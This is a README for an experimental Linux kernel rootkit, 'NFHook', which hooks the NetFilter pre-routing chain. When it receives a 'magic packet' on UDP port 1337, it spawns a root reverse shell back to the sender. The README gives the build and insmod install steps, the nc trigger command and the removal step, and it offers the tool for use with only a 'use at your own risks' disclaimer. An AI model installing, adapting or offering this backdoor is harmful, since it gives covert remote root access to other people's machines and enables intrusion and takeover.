# NFHook: NetFilter Hooking rootkit #

This rootkit registers a hook in the NetFilter pre-routing chain with high
priority, that is all incoming packets get through this hook first.

Once a "magic packet" is received (UDP packet on port 1337), a root reverse shell is
spawned back to the requester on the very same port.

Make sure you have un reverse shell script in `/usr/bin/reverse_shell.sh`

## Compilation ##
```
	$ make
```

## Installation ##
```
	$ sudo insmod nfhook.ko
```

## Usage ##
```
	$ echo "Hello world" | nc -u $target 1337

## Removal ##
```
	$ sudo rmmod nfhook
```

## Disclaimer ##

This is an experimental rootkit. Use it at your own risks.
